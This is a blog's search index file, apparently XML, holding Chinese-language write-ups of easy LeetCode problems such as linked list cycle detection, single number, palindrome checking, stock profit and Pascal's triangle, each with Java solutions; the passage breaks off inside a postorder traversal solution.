<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>141. Linked List Cycle</title>
    <url>/2017/06/19/141-Linked-List-Cycle/</url>
    <content><![CDATA[<p>Given a linked list, determine if it has a cycle in it.</p>
<p>Follow up:</p>
<p>Can you solve it without using extra space?</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>判断是不是环，可以使用快慢指针法：<br></p>
<ol>
<li>要么，指针可以达到尾，说明不是环。<br></li>
<li>要么，快指针会追到慢指针，说明形成环。<br></li>
</ol>
<p>P.S.</p>
<blockquote>
<p>注意使用 <code>do{}while{}</code> 循环简化代码。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123;</span></span><br><span class="line"><span class="comment"> *         val = x;</span></span><br><span class="line"><span class="comment"> *         next = null;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span> || head.next==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode lowNode = head;</span><br><span class="line">        ListNode fastNode = head;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(lowNode!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                lowNode = lowNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(lowNode!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                lowNode = lowNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(fastNode!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                fastNode = fastNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(lowNode!=fastNode);</span><br><span class="line">        <span class="keyword">return</span> fastNode!=<span class="keyword">null</span> &amp;&amp; lowNode!=<span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>快慢指针的典型用法，用来判断是否为构成了环，同时，也应该记住他的另一个功能，用于查找链表中的中位数。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>快慢指针</tag>
      </tags>
  </entry>
  <entry>
    <title>136. Single Number</title>
    <url>/2017/06/19/136-Single-Number/</url>
    <content><![CDATA[<p>Given an array of integers, every element appears twice except for one. Find that single one.</p>
<p><strong>Note:</strong><br>Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?</p>
<p>Subscribe to see which companies asked this question</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><blockquote>
<p>这道题目其实可以通过排序后，遍历数组，然后得到结果。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">1</span>&amp;&amp;nums[i-<span class="number">1</span>]!=nums[i])</span><br><span class="line">                <span class="keyword">return</span> nums[i-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums.length%<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> nums[nums.length-<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>i%2==1</code> 取模操作，很好的解决了排序后每两个间不同的比较。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><blockquote>
<p>异或操作 <code>^</code> 是很好的去除相同元素的办法。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            res ^= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>异或操作是一个很好的去重的方法，这一点在使用的时候很方便，应该在含有偶数个去重的问题中，能够及时联想到这个操作。</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>125. Valid Palindrome</title>
    <url>/2017/06/19/125-Valid-Palindrome/</url>
    <content><![CDATA[<p>Given a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases.</p>
<p><strong>For example,</strong></p>
<p><code>&quot;A man, a plan, a canal: Panama&quot;</code> is a palindrome.<br><br><code>&quot;race a car&quot;</code> is not a palindrome.</p>
<p><strong>Note:</strong></p>
<p>Have you consider that the string might be empty? This is a good question to ask during an interview.</p>
<p>For the purpose of this problem, we define empty string as valid palindrome.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution 1"></a>Solution 1</h2><blockquote>
<p>使用正则表达式过滤。<code>[^a-zA-Z0-9]</code>，过滤非字符数字。</p>
<p>这样做的效率比较低，因为正则表达式创建了一个新的空间，空间复杂度为O(n)。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        s = s.replaceAll(<span class="string">"[^a-zA-Z0-9]"</span>,<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>,j=s.length()-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(Character.toLowerCase(s.charAt(i)) != Character.toLowerCase(s.charAt(j)))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Optimized"><a href="#Optimized" class="headerlink" title="Optimized"></a>Optimized</h1><h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p>减少空间复杂度，直接判断，使用双指针和Character.isLetterOrDigit()方法，可以很方便的判断是否对称。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = s.length()-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">char</span> arr[] = s.toLowerCase().toCharArray();</span><br><span class="line">        <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">            <span class="keyword">if</span>(Character.isLetterOrDigit(arr[low]) &amp;&amp; Character.isLetterOrDigit(arr[high]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[low] != arr[high])&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                low++;</span><br><span class="line">                high--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!Character.isLetterOrDigit(arr[low]))&#123;</span><br><span class="line">                    low++;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!Character.isLetterOrDigit(arr[high]))&#123;</span><br><span class="line">                    high--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这个题主要考察了对字符串中字符的操作，使用双指针方法是很不错的思路！</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>双指针</tag>
      </tags>
  </entry>
  <entry>
    <title>122. Best Time to Buy and Sell Stock II</title>
    <url>/2017/06/16/122-Best-Time-to-Buy-and-Sell-Stock-II/</url>
    <content><![CDATA[<p>Say you have an array for which the ith element is the price of a given stock on day i.</p>
<p>Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times). However, you may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><blockquote>
<p>这道题比较有争议，仔细思考，很简单，只要把赚钱的段取出，相加即可，那这道题这样想的话其实没有可做性了。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> profit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(prices[i]&gt;prices[i-<span class="number">1</span>])&#123;</span><br><span class="line">                profit += (prices[i]-prices[i-<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这种题目应该是，想起来有问题，而做起来是很简单的问题。我觉得还是应该仔细想想出题人的目的。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
      </tags>
  </entry>
  <entry>
    <title>121. Best Time to Buy and Sell Stock</title>
    <url>/2017/06/16/121-Best-Time-to-Buy-and-Sell-Stock/</url>
    <content><![CDATA[<p>Say you have an array for which the ith element is the price of a given stock on day i.</p>
<p>If you were only permitted to complete at most one transaction (ie, buy one and sell one share of the stock), design an algorithm to find the maximum profit.</p>
<p><strong>Example 1:</strong></p>
<pre><code>Input: [7, 1, 5, 3, 6, 4]
Output: 5
max. difference = 6-1 = 5 (not 7-1 = 6, as selling price needs to be larger than buying price)
</code></pre><p><strong>Example 2:</strong></p>
<pre><code>Input: [7, 6, 4, 3, 1]
Output: 0
In this case, no transaction is done, i.e. max profit = 0.
</code></pre><a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><blockquote>
<p>使用暴力方法解，怎么想怎么写，双层循环解决。<br>LeetCode: Time Limit Exceeded</p>
</blockquote>
<h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p>这道题，为什么会感觉很难做，因为逻辑没有搞清楚：</p>
<ol>
<li>什么时候卖出？只要当前利益比它最大收益大，就卖出（可惜不是预测。）</li>
</ol>
<p>什么时候买进？当前值小于上一次买进的值，就应该买进。</p>
<ol>
<li>什么时候买进？当前值小于上一次买进的值，就应该买进。</li>
</ol>
<p>总结：买进和卖出没有联系，卖出是买进前的最大利益，所以当输入[7, 6, 8, 3, 1]，虽然买进是1，但是获利最大是8-6=2，利润是2。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> profit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> buy = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(prices[i]-buy&gt;profit)&#123;</span><br><span class="line">                profit = prices[i] - buy;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(prices[i]&lt;buy)&#123;</span><br><span class="line">                    buy = prices[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><h3 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a><a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%AD%90%E5%BA%8F%E5%88%97" target="_blank" rel="noopener">最长公共子序列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> profit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">            profit += (prices[i] - prices[i-<span class="number">1</span>]);</span><br><span class="line">            profit = Math.max(<span class="number">0</span>,profit);</span><br><span class="line">            max = Math.max(max,profit);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这道题目上栽了好几次了，其实把握第一个基本思路是基础。对于后提到的最长公共子序列算法应该格外注意。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>最长公共子序列（LCS）</tag>
      </tags>
  </entry>
  <entry>
    <title>119. Pascal&#39;s Triangle II</title>
    <url>/2017/06/01/119-Pascal-s-Triangle-II/</url>
    <content><![CDATA[<p>Given an index k, return the kth row of the Pascal’s triangle.</p>
<p>For example, given k = 3,<br>Return <code>[1,3,3,1]</code>.</p>
<p><strong>Note:</strong></p>
<p>Could you optimize your algorithm to use only O(k) extra space?</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>通过上层来计算当前行</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PascalsTriangleII4</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">getRow</span><span class="params">(<span class="keyword">int</span> rowIndex)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;rowIndex;i++)&#123;</span><br><span class="line">            list.add(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;list.size()-<span class="number">1</span>;j++)&#123;</span><br><span class="line">                list.set(j,list.get(j)+list.get(j+<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><blockquote>
<p>其实这个计算是有公式的。</p>
</blockquote>
<h2 id="Calculating-a-row-or-diagonal-by-itself"><a href="#Calculating-a-row-or-diagonal-by-itself" class="headerlink" title="Calculating a row or diagonal by itself"></a><a href="https://en.wikipedia.org/wiki/Pascal%27s_triangle#Calculating_a_row_or_diagonal_by_itself" target="_blank" rel="noopener">Calculating a row or diagonal by itself</a></h2><blockquote>
<p>当前行的值可以通过，改之所在行和索引来计算。</p>
</blockquote>
<p>C[k,i] = C[k,i-1]*(k-i+1)/i</p>
<p>k为第几行，i为该行第几个数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PascalsTriangleII</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">getRow</span><span class="params">(<span class="keyword">int</span> rowIndex)</span> </span>&#123;</span><br><span class="line">        Integer []rowarray = <span class="keyword">new</span> Integer[rowIndex+<span class="number">1</span>];</span><br><span class="line">        rowarray[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;rowarray.length;i++)&#123;</span><br><span class="line">            rowarray[i] = (<span class="keyword">int</span>)((<span class="keyword">long</span>)rowarray[i-<span class="number">1</span>]*(rowIndex+<span class="number">1</span>-i)/(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.asList(rowarray);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这个题目没什么新意，<a href="https://war3cdota.github.io/2017/05/31/118-Pascal-s-Triangle/">118. Pascal’s Triangle</a>，最后的公式计算需要记一下。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Pascal&#39;s Triangle(杨辉三角形)</tag>
      </tags>
  </entry>
  <entry>
    <title>118. Pascal&#39;s Triangle</title>
    <url>/2017/05/31/118-Pascal-s-Triangle/</url>
    <content><![CDATA[<p>Given numRows, generate the first numRows of Pascal’s triangle.</p>
<p>For example, given numRows = 5,</p>
<p>Return</p>
<pre><code>[
     [1],
    [1,1],
   [1,2,1],
  [1,3,3,1],
 [1,4,6,4,1]
]
</code></pre><a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><blockquote>
<p>笨方法，不需要知道规律，只要根据输入，得出输出即可。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PascalsTriangle</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; generate(<span class="keyword">int</span> numRows) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(numRows==<span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        list.add(<span class="number">1</span>);</span><br><span class="line">        result.add(list);</span><br><span class="line">        <span class="keyword">while</span>(numRows&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            list = generate(list);</span><br><span class="line">            result.add(list);</span><br><span class="line">            numRows--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">generate</span><span class="params">(List&lt;Integer&gt; list)</span></span>&#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                result.add(list.get(i-<span class="number">1</span>)+list.get(i));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result.add(list.get(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><blockquote>
<p>找规律，发现，每次比上层多一个元素。规律也很容易发现，需要循环解决。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PascalsTriangle</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; generate(<span class="keyword">int</span> numRows) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numRows;i++)&#123;</span><br><span class="line">            list.add(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;list.size()-<span class="number">1</span>;j++)&#123;</span><br><span class="line">                list.set(j,list.get(j+<span class="number">1</span>) + list.get(j));</span><br><span class="line">            &#125;</span><br><span class="line">            result.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;(list));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<blockquote>
<p>这里思路，很简单，但是其实是根据很多次尝试得出的，包括在list的前面加1，而不是最后加1，因为如果在后面加一，会导致每次获取当前值变得复杂。</p>
<p><code>result.add(new ArrayList&lt;Integer&gt;(list));</code>这行犯了错误，是指针的问题，我觉得需要特别注意！</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这个题目其实找到规律就很简单了：</p>
<ol>
<li>规律，正确的写法。</li>
<li>指针的注意。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Pascal&#39;s Triangle(杨辉三角形)</tag>
      </tags>
  </entry>
  <entry>
    <title>145. Binary Tree Postorder Traversal</title>
    <url>/2017/05/19/145-Binary-Tree-Postorder-Traversal/</url>
    <content><![CDATA[<p>Given a binary tree, return the postorder traversal of its nodes’ values.</p>
<p>For example:<br>Given binary tree <code>{1,#,2,3}</code>,</p>
<pre><code>1
 \
  2
 /
3
</code></pre><p>return <code>[3,2,1]</code>.</p>
<p><strong>Note</strong>: Recursive solution is trivial, could you do it iteratively?</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>使用递归(Recursion)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePostorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using recursion！</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        postorderHelper(list,root);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postorderHelper</span><span class="params">(ArrayList&lt;Integer&gt; list, TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        postorderHelper(list,node.left);</span><br><span class="line">        postorderHelper(list,node.right);</span><br><span class="line">        list.add(node.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line"> <span class="keyword">int</span> val;</span><br><span class="line"> TreeNode left;</span><br><span class="line"> TreeNode right;</span><br><span class="line"> TreeNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<blockquote>
<p>对于[1,2,3,4,5]</p>
</blockquote>
<pre><code>    1
   / \
  2   3
 / \   
4   5
</code></pre><p>我们发现，有后序遍历[4,5,2,3,1]，它的反转[1,3,2,5,4]，是一个遍历先右子树的先序遍历。那么就可以参考先序遍历的思路来解决！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*for [1,2,3,4,5]</span></span><br><span class="line"><span class="comment">         1</span></span><br><span class="line"><span class="comment">        / \</span></span><br><span class="line"><span class="comment">       2   3</span></span><br><span class="line"><span class="comment">      / \   </span></span><br><span class="line"><span class="comment">     4   5</span></span><br><span class="line"><span class="comment">    We have [4,5,2,3,1]  ---&gt;  [1,3,2,5,4]</span></span><br><span class="line"><span class="comment">    It is the reverse of mid--&gt;right--&gt;left !</span></span><br><span class="line"><span class="comment">    So we can refer to the Binary Tree Preorder Traversal !</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePostorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> 